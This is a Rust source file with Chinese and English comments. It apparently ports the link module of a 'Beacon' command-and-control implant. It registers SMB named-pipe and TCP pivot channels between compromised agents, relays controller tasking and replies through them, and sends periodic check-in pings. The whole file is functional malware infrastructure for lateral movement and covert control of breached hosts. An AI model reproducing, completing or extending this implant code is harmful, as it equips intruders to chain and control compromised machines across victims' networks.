//! src/link.cpp 的移植版 —— 管理 SMB/TCP 横向移动（pivot）的 "link" 通道。
//! Port of src/link.cpp — management of SMB/TCP pivot "link" channels.
//!
//! 固定表 `MAX_LINKS` 保存活动的链接，以被链接 Beacon 的 agent id 为键。
//! `link_register` 从新连接的通道读取 agent id 和元数据，
//! `command_link_route` 将数据包转发到链接并轮询回复，`link_poll` 通告 ping，
//! `command_link_stop`/`link_stop` 拆除链接。
//! A fixed table of `MAX_LINKS` entries holds the active links, keyed by the
//! linked beacon's agent id. `link_register` reads an agent id + metadata off
//! a freshly connected channel, `command_link_route` relays a package to a
//! link and polls it for a reply, `link_poll` advertises pings, and
//! `command_link_stop`/`link_stop` tear a link down.

use crate::bformat::FormatP;
use crate::callback::{post_error_na, Callback};
use crate::commands::{CALLBACK_PIPE_CLOSE, CALLBACK_PIPE_OPEN, CALLBACK_PIPE_PING, CALLBACK_PIPE_READ};
use parking_lot::Mutex;
use std::ffi::c_void;
use windows_sys::Win32::System::SystemInformation::GetTickCount;

/// `write_all` 定义在 link_smb.cpp 中；在此重新导出，因为 `link.h` 将其声明为
/// link API 的一部分。`lchannel_smb`、`lchannel_tcp` 和 `command_link_start_explicit`
/// 同样是 link API 的一部分（linkint.h / commands.h），为从 `crate::link`
/// 导入它们的调用者重新导出。
/// `write_all` is defined in link_smb.cpp; re-exported here because
/// `link.h` declares it as part of the link API. `lchannel_smb`,
/// `lchannel_tcp` and `command_link_start_explicit` are likewise part of
/// the link API surface (linkint.h / commands.h) and re-exported for
/// callers that import them from `crate::link`.
pub use crate::link_smb::{command_link_start_explicit, lchannel_smb, write_all};
pub use crate::link_tcp::lchannel_tcp;

// ---- 新通道的提示位（linkint.h）----
// ---- hint bits for a new channel (linkint.h) ----------------------------

/// 被链接的 Beacon 连接到了我们。
/// The linked beacon connected to us.
pub const HINT_REVERSE: i32 = 0x00010000;
/// 我们主动连接到了被链接的 Beacon。
/// We connected to the linked beacon.
pub const HINT_FORWARD: i32 = 0x00000000;
/// 通道是命名管道。
/// The channel is a named pipe.
pub const HINT_PROTO_PIPE: i32 = 0x00000000;
/// 通道是 TCP 套接字。
/// The channel is a TCP socket.
pub const HINT_PROTO_TCP: i32 = 0x00100000;

/// 来自 linkint.h 的 CHANNEL_FORWARD_TCP(x)。
/// CHANNEL_FORWARD_TCP(x) from linkint.h.
pub const fn channel_forward_tcp(x: i32) -> i32 {
    HINT_FORWARD | HINT_PROTO_TCP | x
}

/// 来自 linkint.h 的 CHANNEL_FORWARD_PIPE(x)。
/// CHANNEL_FORWARD_PIPE(x) from linkint.h.
pub const fn channel_forward_pipe(x: i32) -> i32 {
    HINT_FORWARD | HINT_PROTO_PIPE | x
}

/// 来自 linkint.h 的 CHANNEL_REVERSE_TCP(x)。
/// CHANNEL_REVERSE_TCP(x) from linkint.h.
pub const fn channel_reverse_tcp(x: i32) -> i32 {
    HINT_REVERSE | HINT_PROTO_TCP | x
}

/// 来自 linkint.h 的 CHANNEL_REVERSE_PIPE(x)。
/// CHANNEL_REVERSE_PIPE(x) from linkint.h.
pub const fn channel_reverse_pipe(x: i32) -> i32 {
    HINT_REVERSE | HINT_PROTO_PIPE | x
}

/// 我们的 "link" 通道抽象（来自 linkint.h 的 `LCHANNEL`）。
/// Our "link" channel abstraction (`LCHANNEL` from linkint.h).
///
/// `read`/`write`/`ready` 按照 linkint.h 中的契约返回；通道实例地址作为 `thisp` 参数传入。
/// `read`/`write`/`ready` return per the contracts in linkint.h; the channel
/// instance address is passed as the `thisp` argument.
#[derive(Clone, Copy, Default)]
pub struct LChannel {
    pub pipe: isize,
    pub socket: isize,
    pub read: Option<unsafe extern "C" fn(*mut c_void, *mut u8, usize) -> i32>,
    pub write: Option<unsafe extern "C" fn(*mut c_void, *const u8, usize) -> i32>,
    pub close: Option<unsafe extern "C" fn(*mut c_void)>,
    pub flush: Option<unsafe extern "C" fn(*mut c_void)>,
    pub ready: Option<unsafe extern "C" fn(*mut c_void, i32) -> i32>,
    pub wait: Option<unsafe extern "C" fn(*mut c_void)>,
}

const MAX_GET: usize = 1024 * 1024;
const MAX_LINKS: usize = 40;

/// 链接表的一项（link.cpp 的 `link_t`）。
/// One entry of the link table (link.cpp `link_t`).
struct LinkT {
    agentid: u32,
    channel: LChannel,
    active: u32,
    /// 已分配的元数据块（C 代码中是 256 字节），每个槽位复用。
    /// Allocated metadata block (256 bytes in the C code), reused per slot.
    metadata: Vec<u8>,
    mlength: usize,
    ping: u32,
}

impl LinkT {
    const fn empty() -> LinkT {
        LinkT {
            agentid: 0,
            channel: LChannel {
                pipe: 0,
                socket: 0,
                read: None,
                write: None,
                close: None,
                flush: None,
                ready: None,
                wait: None,
            },
            active: 0,
            metadata: Vec::new(),
            mlength: 0,
            ping: 0,
        }
    }
}

/// 链接表（link.cpp 的 `links[MAX_LINKS]`）。与 C 代码一样，元数据块在每
/// 个槽位中保持分配状态，并在链接启动/停止周期之间复用。
/// The link table (link.cpp `links[MAX_LINKS]`). The metadata block stays
/// allocated per slot and is reused across link start/stop cycles, like the
/// C code.
static LINKS: Mutex<[LinkT; MAX_LINKS]> = Mutex::new([const { LinkT::empty() }; MAX_LINKS]);
/// 在已链接 Beacon 之间传递的缓冲区（link.cpp 的 `link_read_buffer`）。
/// Buffer handed between linked beacons (link.cpp `link_read_buffer`).
static LINK_READ_BUFFER: Mutex<Vec<u8>> = Mutex::new(Vec::new());

/// 注册一个新链接：读取 agent id + 元数据（link_register）。
/// Register a new link: read agent id + metadata (link_register).
///
/// 通道必须在 30 秒内准备好可读；第一帧是 agent id（原始主机字节序 int），
/// 后面跟着被链接 Beacon 的元数据。元数据块 `[agentid][hint][metadata]`
/// 以 `CALLBACK_PIPE_OPEN` 的形式上报给控制器。
/// The channel must be ready to read within 30s; the first frame is the
/// agent id (raw host-order int) followed by the linked beacon's metadata.
/// The metadata block `[agentid][hint][metadata]` is reported to the
/// controller as `CALLBACK_PIPE_OPEN`.
pub fn link_register(channel: LChannel, hint: i32, cb: Callback) -> bool {
    // 检查我们是否准备好读取。
    // Check if we're ready to read.
    let ready = match channel.ready {
        Some(f) => unsafe { f(&channel as *const LChannel as *mut c_void, 30000) != 0 },
        None => false,
    };
    if !ready {
        return false;
    }

    // 从管道读取 agent id。
    // Read the agent id from the pipe.
    let mut response = [0u8; 256];
    let status = match channel.read {
        Some(f) => unsafe { f(&channel as *const LChannel as *mut c_void, response.as_mut_ptr(), 256) },
        None => -1,
    };
    if status < 0 {
        return false;
    }
    // memcpy(&agentid, response, 4)：x86 上的原始主机字节序 int。
    // memcpy(&agentid, response, 4): raw host-order int on x86.
    let agentid = u32::from_le_bytes(response[..4].try_into().unwrap());

    // 构建我们的元数据结构，其传达：agentid、端口提示和被链接 Beacon 的元数据。
    // Build up our metadata structure which communicates: agentid, port
    // hint, and the linked beacon's metadata.
    let mut buffer = FormatP::init(256);
    buffer.bformat_int(agentid as i32);
    buffer.bformat_int(hint);
    if status > 4 {
        buffer.bformat_copy(&response[4..status as usize]);
    }
    let meta = buffer.bformat_string().to_vec();
    let mlength = meta.len();

    // 看起来没问题？把通道分配给某个空的链接槽位。
    // Looks good? Assign the channel to one of the empty link slots.
    let mut links = LINKS.lock();
    for x in 0..MAX_LINKS {
        if links[x].active != 0 {
            continue;
        }
        links[x].active = 1;
        links[x].agentid = agentid;
        links[x].channel = channel;
        links[x].ping = 0;
        links[x].metadata = meta.clone();
        links[x].mlength = mlength;

        // 让用户知道我们已经建立了管道或链接。
        // Let the user know we have established our pipe or link.
        drop(links);
        cb(&meta, mlength as i32, CALLBACK_PIPE_OPEN);
        return true;
    }
    drop(links);
    post_error_na(0x05);
    false
}

/// 查找一个链接并重新发送元数据（command_link_reopen）。
/// Find a link and resend metadata (command_link_reopen).
///
/// [agent id] - 4 字节（网络字节序）。
/// [agent id] - 4 bytes (network order).
pub fn command_link_reopen(buffer: &[u8], length: usize, cb: Callback) {
    if length < 4 {
        return;
    }
    let agentid = u32::from_be_bytes(buffer[..4].try_into().unwrap());

    let links = LINKS.lock();
    for x in 0..MAX_LINKS {
        if links[x].active == 1 && links[x].agentid == agentid {
            let meta = links[x].metadata.clone();
            let mlength = links[x].mlength;
            drop(links);
            cb(&meta, mlength as i32, CALLBACK_PIPE_OPEN);
            return;
        }
    }
}

/// 把数据路由到链接，并轮询它是否有数据可读（command_link_route）。
/// Route data to a link and poll it for data to read (command_link_route).
///
/// [agent id] - 4 字节（网络字节序）
/// [package]  - X 字节
/// [agent id] - 4 bytes (network order)
/// [package]  - X bytes
///
/// 零长度的数据包仍会被写入（它起到签到作用）；回复（或没读到数据时的
/// 4 字节 ping）以 `CALLBACK_PIPE_READ` 的形式发布。
/// A zero-length package is still written (it acts as a check-in); the
/// reply (or a 4-byte ping when nothing was read) is posted as
/// `CALLBACK_PIPE_READ`.
pub fn command_link_route(buffer: &[u8], length: usize, cb: Callback) {
    if length < 4 {
        return;
    }

    // 解析出 agent id（线上使用网络字节序）。
    // Parse out the agent id (network byte order on the wire).
    let agentid_n: [u8; 4] = buffer[..4].try_into().unwrap();
    let agentid = u32::from_be_bytes(agentid_n);
    let payload = &buffer[4..length];

    let mut posted: Vec<Vec<u8>> = Vec::new();
    let mut stop = false;

    {
        let mut lb = LINK_READ_BUFFER.lock();
        if lb.is_empty() {
            *lb = vec![0u8; MAX_GET];
        }

        let links = LINKS.lock();
        for x in 0..MAX_LINKS {
            if links[x].agentid != agentid || links[x].active != 1 {
                continue;
            }

            // 写入我们的数据（或零长度的签到）。
            // Write our data (or a zero-length check-in).
            let status = match links[x].channel.write {
                Some(f) => unsafe {
                    if !payload.is_empty() {
                        f(
                            &links[x].channel as *const LChannel as *mut c_void,
                            payload.as_ptr(),
                            payload.len(),
                        )
                    } else {
                        f(&links[x].channel as *const LChannel as *mut c_void, std::ptr::null(), 0)
                    }
                },
                None => 0,
            };
            if status == 0 {
                stop = true;
                break;
            }

            // 把我们的（网络字节序的）agent id 复制到读缓冲区。
            // Copy our (network-byte ordered) agent id to the read buffer.
            lb[..4].copy_from_slice(&agentid_n);

            // 检查我们是否准备好读取。
            // Check if we're ready to read.
            let read = match links[x].channel.ready {
                Some(f)
                    if unsafe { f(&links[x].channel as *const LChannel as *mut c_void, 300000) != 0 } =>
                {
                    match links[x].channel.read {
                        Some(rf) => unsafe {
                            rf(
                                &links[x].channel as *const LChannel as *mut c_void,
                                lb[4..].as_mut_ptr(),
                                MAX_GET - 4,
                            )
                        },
                        None => -1,
                    }
                }
                _ => -1,
            };

            if read > 0 {
                // 无论是否读到内容……都发布它。
                // Whether we read anything or not... post it.
                posted.push(lb[..4 + read as usize].to_vec());
            } else if read == 0 {
                // 发一个 ping……只是为了证明系统签到过了。
                // Do a ping... just to prove the system checked in.
                posted.push(lb[..4].to_vec());
            } else if read < 0 {
                stop = true;
            }
        }
    }

    for data in &posted {
        cb(data, data.len() as i32, CALLBACK_PIPE_READ);
    }
    if stop {
        link_stop(agentid, cb);
    }
}

/// 每次签到后，通告我们已链接的 Beacon（link_poll）。
/// After each check-in, advertise the beacons we have linked (link_poll).
pub fn link_poll(cb: Callback) {
    let mut pings: Vec<u32> = Vec::new();
    {
        let now = unsafe { GetTickCount() };
        let mut links = LINKS.lock();
        for x in 0..MAX_LINKS {
            if links[x].active == 1 && links[x].ping < now {
                // 我们大约每 15 秒只发送一次 ping。
                // We should only send a ping once every 15s or so.
                links[x].ping = now.wrapping_add(15000);
                pings.push(links[x].agentid);
            }
        }
    }
    for id in pings {
        // 发布一条消息，表明这个管道在这里。
        // Post a message indicating that this pipe is here.
        let be = id.to_be_bytes();
        cb(&be, 4, CALLBACK_PIPE_PING);
    }
}

/// 终止一个链接（command_link_stop）。
/// Kill a link (command_link_stop).
///
/// @arg [agent id] = 4 字节（网络字节序）。
/// @arg [agent id] = 4 bytes (network order).
pub fn command_link_stop(buffer: &[u8], length: usize, cb: Callback) {
    if length < 4 {
        return;
    }
    let agentid = u32::from_be_bytes(buffer[..4].try_into().unwrap());
    link_stop(agentid, cb);
}

/// 停止具有给定（主机字节序）agent id 的链接（link_stop）。
/// Stop the link with the given (host-order) agent id (link_stop).
pub fn link_stop(agentid: u32, cb: Callback) {
    let channel = {
        let links = LINKS.lock();
        let mut found: Option<LChannel> = None;
        for x in 0..MAX_LINKS {
            if links[x].agentid == agentid && links[x].active == 1 {
                found = Some(links[x].channel);
                break;
            }
        }
        found
    };
    let Some(ch) = channel else {
        return;
    };

    // 发布一条消息，表明这个管道已经消失。
    // Post a message indicating that this pipe is gone.
    let be = agentid.to_be_bytes();
    cb(&be, 4, CALLBACK_PIPE_CLOSE);

    // 关闭连接。
    // Close the connection.
    if let Some(f) = ch.close {
        unsafe { f(&ch as *const LChannel as *mut c_void) };
    }

    // 重置链接。
    // Reset the link.
    let mut links = LINKS.lock();
    for x in 0..MAX_LINKS {
        if links[x].agentid == agentid && links[x].active == 1 {
            links[x].agentid = 0;
            links[x].active = 0;
            links[x].ping = 0;
            break;
        }
    }
}

/// 构建我们的帧头（适用于任一 C2 类型）（link_frame_header）。
/// Build our frame header (for either C2 type) (link_frame_header).
///
/// 帧头设置（`smb_frame_header` / `tcp_frame_header`）为
/// `[2b 长度（网络字节序）][帧字节]`；帧的最后 4 字节以原始（主机字节序）int
/// 承载 `message`，与 C 代码完全一致地 memcpy。
/// The frame header setting (`smb_frame_header` / `tcp_frame_header`) is
/// `[2b length (network order)][frame bytes]`; the last 4 bytes of the
/// frame carry `message` as a raw (host-order) int, memcpy'd exactly like
/// the C code.
pub fn link_frame_header(rtype: i32, message: i32, size: &mut usize) -> Vec<u8> {
    let ptr = crate::settings::setting_ptr(rtype as usize).unwrap_or(&[]);

    // 读取我们的长度（对设置数据块做 data_short）。
    // Read our length (data_short over the setting blob).
    let len = if ptr.len() >= 2 {
        u16::from_be_bytes([ptr[0], ptr[1]]) as usize
    } else {
        0
    };
    *size = len;

    // 获取我们的帧指针（对设置数据块做 data_ptr）。
    // Get our frame pointer (data_ptr over the setting blob).
    let mut frame = if ptr.len() >= 2 + len {
        ptr[2..2 + len].to_vec()
    } else {
        vec![0u8; len]
    };

    // 在此指针中设置帧值：memcpy(val + size - 4, &message, 4)。
    // Set our frame value in this pointer: memcpy(val + size - 4, &message, 4).
    if len >= 4 {
        frame[len - 4..].copy_from_slice(&message.to_ne_bytes());
    }
    frame
}

/// `command_link_start_explicit` 的已弃用别名（COMMAND_PIPE_OPEN 是启动显式
/// SMB 链接的原始名称；proto.cpp 不再分发它，但保留入口点以保持 API 兼容）。
/// Deprecated alias of `command_link_start_explicit` (COMMAND_PIPE_OPEN was
/// the original name for starting an explicit SMB link; proto.cpp no longer
/// dispatches it, but the entry point is kept for API compatibility).
pub fn command_link_start(buffer: &[u8], length: usize, cb: Callback) {
    crate::link_smb::command_link_start_explicit(buffer, length, cb);
}
